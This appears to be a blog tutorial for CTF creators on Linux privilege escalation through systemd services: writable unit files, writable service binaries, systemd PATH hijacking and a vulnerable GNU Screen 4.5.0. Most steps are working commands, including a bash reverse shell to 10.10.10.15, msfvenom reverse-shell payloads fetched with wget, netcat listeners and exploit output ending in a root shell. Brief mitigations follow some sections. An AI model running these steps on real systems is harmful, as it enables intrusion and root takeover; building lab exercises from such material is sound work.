# Linux Privilege Escalation - Services for CTF Creators


# Services

Services are programs that run in the background waiting to be used or carrying out some tasks.

Service **configuration files** should never be **writable** by other users.

Programs used by **service configuration files** should never be **writable** by other users.

Some **programs** that are running as a service may be **vulnerable**.

## Service Configuration Files

The service configuration files end with **.service** and define how services are managed by the operating system.

If you can **write** to any **.service** file, as an attacker you could modify it so it executes a backdoor when the service is **started**, **restarted** or **stopped**(sometimes you will need to wait until the machine is rebooted if you don't have privileges to reboot the machine).

For more information regarding units read this [tutorial](https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files).

The **multi-user.target** means that the systemd-service will start when the system reaches runlevel 2.

Here's a table of the targets and their run levels:

| Run Level | Target Units                            | Description                       |
|-----------|-----------------------------------------|-----------------------------------|
| 0         | runlevel0.target, poweroff.target       | Shut down and power off           |
| 1         | runlevel1.target, rescue.target         | Set up a rescue shell             |
| 2,3,4     | runlevel[234].target, multi-user.target | Set up a non-gfx multi-user shell |
| 5         | runlevel5.target, graphical.target      | Set up a gfx multi-user shell     |
| 6         | runlevel6.target, reboot.target         | Shut down and reboot the system   |

# Privilege Escalation via Writable _.service_ files

If we can write any `.service` file, we **could modify it** so it **executes** your **backdoor when** the service is **started**, **restarted** or **stopped**.

We'll create a service configuration file:

```shell
sudo vim /etc/systemd/system/name.service

[Unit]
Description=Misconfigured service config

[Service]
Type=basic
ExecStart=/usr/bin/rsync

[Install]
WantedBy=multi-user.target
```

We'll add write permissions to the service so that other users can write to this file:

```shell
sudo chmod o+w /etc/systemd/system/name.service
```

We can create simple payload:

```shell
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.10.15/1234 0>&1' >> /tmp/script.sh
```

We'll add execution permissions:

```shell
chmod +x /tmp/script.sh
```

Modify the `ExecStart` variable which we'll hold the script absolute path:

```shell
ExecStart=/tmp/script.sh
```

Since this service is configured to run as the root user. The payload will be executed under the security context of the root user.

```shell
sudo systemctl restart name.service
```

We'll then receive a connection as the root user:

```shell
nc -lvnp 1234
```

We can mitigate this risk by removing the other writable permissions:

```shell
sudo chmod o-w /etc/systemd/system/name.service
```

# Privilege Escalation via Writable service binaries

If we have **write permissions over binaries being executed by services**, we can change them for backdoors so that when the services get re-executed the backdoors will be executed.

When a binary has writable permissions, we can just replace the binary:

```shell
user@pwn:~$ which rsync
/usr/bin/rsync
user@pwn:~$ ls -l /usr/bin/rsync
-rwxr-xr-x 1 root root 516760 Oct 14  2019 /usr/bin/rsync
user@pwn:~$ sudo chmod o+w /usr/bin/rsync
```

Create a backup of the original binary:

```shell
cp /usr/bin/rsync /tmp/rsync.bak
```

Generate a reverse shell payload:

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.15 LPORT=53 -f elf -o rev_shell
```

Transfer the file to the target:

```shell
sudo python3 -m http.server 80

cd /dev/shm
wget 10.10.10.15/rev_shell -O rev_shell
```

Add execute permissions:

```shell
chmod +x rev_shell
```

Replace the original binary with the reverse shell payload:

```shell
cp /dev/shm/rev_shell /usr/bin/rsync
```

Setup a listener:

```shell
sudo nc -lvnp 53
```

Since this service is configured to run as the root user. The payload will be executed under the security context of the root user.

```shell
systemctl restart name.service
```

Then we'll a receive a shell as the root user:

```shell
sudo nc -lvnp 53
```

Afterwards, we can restore the backup:

```shell
cp /tmp/rsync.bak /usr/bin/rsync 
```

Remove the binary writable permissions:

```shell
sudo chmod o-w /usr/bin/rsync
```

# Privilege Escalation via systemd PATH

We can see the `path` environment variable used by **systemd** with the following command:

```shell
systemctl show-environment
```

We'll then verify if we have write permissions in any of the previous directories before the `/usr/bin` directory:

```shell
❯ systemctl show-environment | grep PATH | cut -d '=' -f 2 | tr ':' '\n'
/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
/sbin
/bin

systemctl show-environment | grep PATH | cut -d '=' -f 2 | tr ':' '\n' | xargs ls -dl
```

Here is how this works:

{{< image src="/images/posts/systemd-path-image.png" caption="Systemd PATH Image" src_s="/images/posts/systemd-path-image.png" src_l="/images/posts/systemd-path-image.png" >}}

We'll append write permissions:

```shell
sudo chmod o+w /usr/local/bin
```

If we find that we can **write** in any of the folders of the path we may be able to **escalate privileges**. we need to search for **relative paths being used on service configurations** files like:

```shell
sudo vim /etc/systemd/system/name.service

ExecStart=rsync
```

Then, we'll create an **executable** with the **same name as the relative path binary** inside the systemd PATH folder we can write, and when the service is asked to execute the vulnerable action (**Start**, **Stop**, **Reload**), the **backdoor will be executed**.

Generate a reverse shell file in our adversary host:

```shell
msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=10.10.10.15 LPORT=53 -f elf -o rev_shell
msfvenom -a x86 -p linux/x86/shell_reverse_tcp LHOST=10.10.10.15 LPORT=53 -f elf -o rev_shell
```

In our adversary host, we'll set up an HTTP server:

```shell
sudo python3 -m http.server 80
```

On the victim host, we download the payload:

```shell
wget 10.10.10.15/rev_shell -O /dev/shm/rev_shell
```

Copy the payload to replace the original binary:

```shell
cp /dev/shm/rev_shell /usr/local/bin/rsync
```

Since the service is configured to run as the root user, it'll execute the payload under security context of the root user:

```shell
sudo systemctl restart name.service
```

We'll then wait for the connection as the root user:

```shell
sudo nc -lvnp 53
```

After we have elevated privileges. We can then remove the payload:

```shell
rm /usr/local/bin/rsync
```

We can mitigate this risk by adding the absolute path of the binary:

```shell
sudo vim /etc/systemd/system/name.service

ExecStart=/usr/bin/rsync
```

# Privilege Escalation via Vulnerable Service

We'll download a vulnerable version of GNU Screen through [exploit-db official site](https://www.exploit-db.com/exploits/41154). Then we'll install it in our victim system. We'll start by installing `cmake` with our package manager:

```shell
sudo apt install cmake
```

We'll download GNU Screen 4.5.0 to our victim system:

```shell
user@pwn:~/Downloads$ wget https://www.exploit-db.com/apps/xxxxxxxxxxxxxxxxxxxxxxxx-screen-4.5.0.tar.gz



--2021-11-20 17:24:45--  https://www.exploit-db.com/apps/xxxxxxxxxxxxxxxxxxxxxxxx-screen-4.5.0.tar.gz
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 963233 (941K) [application/x-gzip]
Saving to: ‘xxxxxxxxxxxxxxxxxxxxxxxx-screen-4.5.0.tar.gz’

xxxxxxxxxxxxxxxxxxxxxxxx-screen-4.5. 100%[==============================================================================================>] 940.66K  3.24MB/s    in 0.3s    

2021-11-20 17:24:46 (3.24 MB/s) - ‘xxxxxxxxxxxxxxxxxxxxxxxx-screen-4.5.0.tar.gz’ saved [963233/963233]

user@pwn:~/Downloads$ ls
xxxxxxxxxxxxxxxxxxxxxxxx-screen-4.5.0.tar.gz


user@pwn:~/Downloads$ tar -xxvf xxxxxxxxxxxxxxxxxxxxxxxx-screen-4.5.0.tar.gz 
```

Then we'll install it with the command line using the following commands:

```shell
cd screen-4.5.0/
sudo apt install libncurses5-dev
./configure
make
sudo make install screen
```

We'll then verify if the program has been installed in the system:

```shell
user@pwn:~/Downloads/screen-4.5.0$ screen --version
Screen version 4.05.00 (GNU) 10-Dec-16
```

Next, we'll attempt to exploit the `GNU Screen` program:

```shell
user@pwn:~$ vim exploit.sh
user@pwn:~$ chmod +x service_exploit.sh 
user@pwn:~$ ./exploit.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-low.

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000 (user)
# 
```

As shown above, vulnerable service can lead us to higher privileges.
